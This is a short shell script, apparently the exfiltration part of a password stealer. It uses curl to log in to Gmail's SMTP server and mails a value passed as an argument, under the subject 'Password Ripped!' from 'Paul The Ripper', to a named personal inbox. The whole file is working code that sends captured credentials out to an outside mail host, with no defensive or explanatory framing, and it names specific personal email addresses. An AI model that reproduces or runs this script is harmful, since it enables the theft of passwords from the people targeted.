curl --ssl-reqd \
--url 'smtp://smtp.gmail.com:587' \
--user $1 \
--mail-from clonevol1@gmail.com \
--mail-rcpt longnghia2.00@gmail.com \
--upload-file - <<EOF
From: Paul The Ripper <clonevol1@gmail.com>
To: LONGNGHIA <longnghia2.00@gmail.com>
Subject: Password Ripped!
Content-Type: multipart/alternative; boundary="boundary-string"

--boundary-string
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline

$2

--boundary-string--
EOF
